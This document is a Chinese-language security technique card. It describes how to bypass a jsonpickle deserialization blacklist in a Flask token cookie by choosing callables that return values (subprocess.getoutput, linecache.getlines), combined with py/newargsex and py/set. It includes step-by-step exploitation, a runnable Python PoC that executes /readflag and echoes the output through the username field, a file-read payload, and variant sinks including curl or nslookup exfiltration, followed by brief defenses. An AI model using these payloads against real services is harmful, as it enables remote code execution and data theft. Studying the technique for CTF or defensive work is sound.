---
id: web-python-deserialization-jsonpickle-return-value-callable-field-echo
title: jsonpickle 黑名单把 nt/posix/popen/tuple/reduce 全封死时：改挑"有返回值"的 callable（subprocess.getoutput、linecache.getlines）配 py/newargsex + py/set，借业务回显字段把输出带回来
type: scenario
domain: web
path: web/python/deserialization
technique: jsonpickle-return-value-callable-field-echo-bypass
aliases:
- jsonpickle 无回显怎么办
- subprocess.getoutput 回显
- linecache.getlines 读文件
- py/set 代替 py/tuple
- 黑名单封 nt posix popen
- 用业务字段回显命令输出
tags:
- web
- python
- jsonpickle
- deserialization
- waf-bypass
- rce
- file-read
- token
- flask
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W8
  verified_at: '2026-11-09T02:43:23+08:00'
  notes: 已对照原文核对；本次核对未读取图片；原文源码的 BLACKLIST（repr/state/json/reduce/tuple/nt/\\/builtins/os/popen/exec/eval/posix/spawn/compile/code）、jsonpickle.decode(jtoken, safe=True)、base64.urlsafe_b64decode、60 秒 timestamp 校验、以及两条 payload（linecache.getlines 读 ./flag、subprocess.getoutput 执行 whoami//readflag，均以 py/object + py/newargsex + py/set 形式、token.username 承接返回值并由非 admin 分支 f-string 回显）与卡片 PoC 一致；现场生成 timestamp 的 requests 脚本亦与正文一致。未验证点/可保留问题：卡内称 py/newargsex 第二元素给空串或空字典均可，原文只给了空串且未解释其语义，此点为按 jsonpickle 实现推测；卡内「safe=True 只影响 py/repr」属对库行为的概括，原文只描述为限制反序列化范围。dedup 复查：与 web-python-deserialization-jsonpickle-token-popen-newargsex-cmdi 确为同一 token 场景的相邻变体，但该卡依赖 subprocess.Popen 落文件到可写 Web 目录，本条依赖「返回 str/list 的 callable + 业务字段回显」且黑名单额外封了 nt/posix/popen/tuple，sink 选择与结果取出方式不同，append_scenario 的 dedup_review 成立，保留
---

## 一句话结论

当目标的 jsonpickle 黑名单把常见替代路径全都点名封掉（`reduce`、`tuple`、`nt`、`posix`、`popen`、`os`、`builtins`、`exec`、`eval`）时，剩下的可行道路不是"再找一个模块别名"，而是**换一类 sink**：选 `subprocess.getoutput`（返回 str）或 `linecache.getlines`（返回行列表）这种"把结果当返回值带出来"的 callable，用 `py/object` + `py/newargsex` 传参、用 `py/set` 顶替被禁的 `py/tuple`，再把整个对象塞进 token 里那个会被业务拼进响应的字段（例如 `username`），让应用自己的回显分支替你把命令输出打印出来——不需要反弹 shell、不需要出网、不需要落地文件。

## 原理

- **黑名单封的是"名字"，不是"能力"**：`nt`/`posix` 被禁说明出题人补上了"`os` 的等价模块名"这条常见绕过；`popen` 被禁说明他知道 `subprocess.Popen`；`tuple`/`reduce` 被禁说明他知道标签替换。但黑名单无法枚举"所有会返回字符串的 callable"——`subprocess.getoutput`、`linecache.getlines`、`glob.glob`、`os.listdir` 这类函数既不在表里，也不含任何被禁子串。
- **为什么"有返回值"是关键**：`os.system`/`Popen` 只起进程、返回值是退出码或对象，在无回显、不出网的环境里等于哑火；而 `jsonpickle` 的 `py/object` 走的是 `instance = cls(*args)`，**调用结果就是反序列化得到的对象**。于是只要这个对象会被应用 `str()`/格式化进响应，callable 的返回值就直接变成了回显通道。这是"把 RCE 变成命令回显"的核心，而不是靠盲打。
- **回显点常常在"失败分支"**：样例里 `/home` 只有 `token.username != 'admin'` 时才 `return f'Welcome {token.username}, ...'`。所以不能用 `username: "admin"`（那会走到只返回一句固定文案的分支），必须让 `username` 本身是那个 payload 对象——反序列化后 `token.username` 是 `getoutput` 的返回字符串，既不等于 `'admin'` 又会被拼进响应，一次请求即拿到输出。
- **`py/newargsex` + `py/set` 的组合为何有效**：`_restore_object_instance` 命中 `py/newargsex` 时执行 `args, kwargs = obj['py/newargsex']`，取第一个元素当位置参数；`_restore_set` 会把 `py/set` 里的元素逐个 restore 成一个 set 当可迭代对象。`getoutput` 只收一个字符串参数，用 `{"py/set":["whoami"]}` 完全等价于 `("whoami",)`，从而绕开被禁的 `py/tuple`。第二元素给 `""` 或 `{}` 都行，只要能让两元解包成立。
- **时间戳校验是另一个必须绕的门**：`time() - token.timestamp < 60` 在 decode 之后立刻执行，所以 payload 里的 `timestamp` 必须是"发请求那一刻"的浮点数——写死值一定过期。这也是为什么这类题最后都要落到一个脚本：每次现场生成 JSON、现场 base64。
- **`safe=True` 不构成任何限制**：它只影响 `py/repr`；`py/object`、`py/reduce`、`py/newargsex` 全部照常工作。

## 触发条件

- 应用把客户端可控的 token/cookie 直接交给 `jsonpickle.decode(..., safe=True)`，且解码结果被业务读取属性、拼进响应（回显字段可以是用户名、欢迎语、错误信息、日志页）。
- token 结构对外可读（base64/base64url 后的 JSON 含 `py/object`、业务字段名、`timestamp`），攻击者能确定外层类名与字段名。
- 黑名单是"对 `json.loads` 后再 `json.dumps` 的字符串做子串匹配"，并且已经封掉了 `reduce`/`tuple`/`nt`/`posix`/`popen`/`os`/`builtins`/`exec`/`eval` 这类常见词。
- 目标进程能导入 `subprocess`/`linecache`（标准库即可），且 session 有效期足够完成一次请求（样例 60 秒）。
- 无回显、不能出网也没关系——本路线不依赖外带。

## 利用步骤

1. 用普通账号登录，取回 token，base64 解码确认结构：`{"py/object": "__main__.Token", "username": ..., "timestamp": ...}`。
2. 先把 `username` 改成 `"admin"` 并给现场时间戳，重放确认越权分支与隐藏路径提示，同时**观察非 admin 分支是否回显 `username`**——那个位置就是后续的输出通道。
3. 探测黑名单粒度：分别试 `{"py/reduce": ...}`、`{"py/tuple": ...}`、`{"py/object":"nt.system",...}`、`{"py/object":"subprocess.Popen",...}`，确认哪些词被拦。样例的结论是 `reduce`/`tuple`/`nt`/`posix`/`popen`/`os`/`builtins`/`exec`/`eval` 都不可用。
4. 选返回值型 callable：命令执行用 `subprocess.getoutput`；读文件用 `linecache.getlines`（读到的内容作为列表被格式化进响应）；其它可选 `glob.glob`、`os.listdir`（注意 `os` 可能被拦）。
5. 组装 payload：外层保留 `{"py/object": "__main__.Token", ...}`，把 `username` 换成 `{"py/object": "<callable>", "py/newargsex": [{"py/set": ["<参数>"]}, ""]}`，`timestamp` 用 `time.time()` 现场生成，整体 base64 后放进 `token` cookie。
6. 发一次请求读响应；命令里不要用管道/重定向以外的 shell 特性（`getoutput` 走 `sh -c`），需要读 flag 就直接 `/readflag` 或 `cat /flag`。
7. 若返回 500：先补全外层类需要的全部字段（`username`/`timestamp` 等），500 往往不是"没打通"而是"执行成功但后面取属性报错"；再检查 `py/newargsex` 第二元素是否缺失导致解包失败。

## PoC

命令执行 + 业务字段回显（`timestamp` 必须现场生成）：

```python
import base64, json, time, requests

payload = {
    "py/object": "__main__.Token",
    "username": {
        "py/object": "subprocess.getoutput",
        "py/newargsex": [{"py/set": ["/readflag"]}, ""]
    },
    "timestamp": time.time(),
}
raw = json.dumps(payload, ensure_ascii=False)
token = base64.b64encode(raw.encode()).decode()
print(requests.get("http://target/home",
                   cookies={"token": token}).text)
```

文件读取回显：

```json
{"py/object": "__main__.Token",
 "username": {"py/object": "linecache.getlines",
              "py/newargsex": [{"py/set": ["./flag"]}, ""]},
 "timestamp": 1733463288.647048}
```

```text
被禁  -> 替代
py/reduce    -> py/object
py/tuple     -> py/set
nt/posix.system, subprocess.Popen -> subprocess.getoutput（返回值是 str）
os/eval/exec -> linecache.getlines（返回值是 list）
无回显        -> 把 callable 塞进会被拼进响应的字段（如 username），保持 != 'admin'
```

## 变体与关联

- **变体一（顺序/参数个数）**：`py/set` 会去重且无序，只适合单参数；需要多参数时改为 `py/newargs`（位置参数列表）或 `py/initargs`，或把参数拼成一个 shell 字符串交给 `getoutput`。
- **变体二（换 sink）**：`subprocess.check_output`（返回 bytes）、`timeit.main`（把语句当计时脚本跑）、`pydoc.pipepager`（把命令输出管道给分页器）、`uuid._get_command_stdout`（内部调 Popen）；被拦的词不同就换一个不被拦的。
- **变体三（外带而非回显）**：若响应里没有任何字段会被回显，用 `subprocess.getoutput` 拼 `curl`/`nslookup` 外带，或改用 `Popen` 落地文件到静态目录（见关联卡）。
- **变体四（先读黑名单再打）**：不确定黑名单内容时，先用 `{"py/mod": "__main__/x.__dict__"}` 或 `{"py/function": "__main__.__dict__"}` 把模块全局读回来（含黑名单本身），再挑漏网的 callable。
- **关联**：[[web-python-deserialization-jsonpickle-token-popen-newargsex-cmdi]]（同一类 token 反序列化题，但走 `subprocess.Popen` 落地文件取结果，依赖 Web 目录可写；本条的核心是用"返回字符串的 callable + 业务回显"替代落地文件）、[[web-python-deserialization-jsonpickle-tag-swap-newargsex-map-bytes-rce]]（键名被黑名单封禁时的等价标签替换矩阵与 `bytes+map` 触发点）、[[web-python-deserialization-jsonpickle-tag-surface-info-leak-rce]]（标签面读全局与"挑可调用对象"清单）、[[web-python-deserialization-jsonpickle-forbidden-list-clear-bypass]]（另一条有状态绕过：先把全局黑名单清空）。

## 检测与防御

- **入口**：不要用 `jsonpickle` 解析令牌；改用 `itsdangerous` 签名/JWT + 服务端状态，验签失败立刻返回且不反序列化。必须用时显式传 `classes=` 白名单，并在 decode 前递归拒绝任何含 `py/` 前缀的键。
- **不要做关键词黑名单**：本卡说明"封掉 nt/posix/popen/tuple/reduce"仍不够——黑名单永远漏项。正确做法是结构白名单（只允许业务字段名与标量值），并且**禁止把解码结果直接拼进响应**（回显本身就是这条链的一半）。
- **检测点**：token/cookie 解码后出现 `py/object`、`py/newargsex`、`py/set`、`py/mod`、`getoutput`、`linecache`、`/readflag`；同一来源短时间内多次提交不同 `timestamp` 的同一 payload（现场生成时间戳的自动化特征）；Web 进程派生 `sh -c` 子进程或出现异常文件读取。
- **加固**：Web 进程最小权限、flag 与源码不可读；令牌里 `timestamp` 这类业务字段应放在服务端，不做成客户端可改的自签字段；对响应渲染做输出转义，避免"字段即回显通道"。
